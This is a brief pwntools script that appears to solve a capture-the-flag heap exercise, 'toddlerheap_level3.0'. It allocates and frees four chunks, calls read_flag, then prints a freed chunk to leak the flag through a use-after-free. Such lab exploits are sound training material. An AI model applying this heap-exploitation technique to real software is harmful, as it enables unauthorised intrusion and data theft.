from pwn import *
#0x300
#0x600 - 0x10

context.arch = 'amd64'
BINARY = "/challenge/toddlerheap_level3.0"
p = process(BINARY)

for i in range(4):
    p.sendline(f'malloc {i} 1520')
for i in range(4):
    p.sendline(f"free {i}")


p.sendline(b"read_flag")
p.sendline(b"puts 3")
p.interactive()